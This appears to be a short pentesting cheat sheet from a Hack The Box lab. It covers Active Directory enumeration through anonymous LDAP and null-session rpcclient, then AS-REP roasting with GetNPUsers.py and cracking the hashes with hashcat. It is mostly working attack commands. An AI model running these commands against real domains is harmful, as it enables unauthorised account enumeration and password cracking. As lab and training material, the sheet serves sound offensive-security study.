# Active Directory

## ldapsearch

It's worth checking if the LDAP service allows anonymous binds using the ldapsearch tool

## RPC Enum

`rpcclient -U "" 10.10.10.161`

`enumdomusers` `enumdomgroups`

Query domain admins `querygroup 0x200` `querygroupmem 0x200`

Query admin `queryuser 0x1f4`

## AS-REP roasting

There is an option for an account to have the property Do not require Kerberos preauthentication or UF\_DONT\_REQUIRE\_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts. I have a list of accounts from my RPC enumeration above. Ill start without the SM _or HealthMailbox_ accounts

`for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`

`hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`

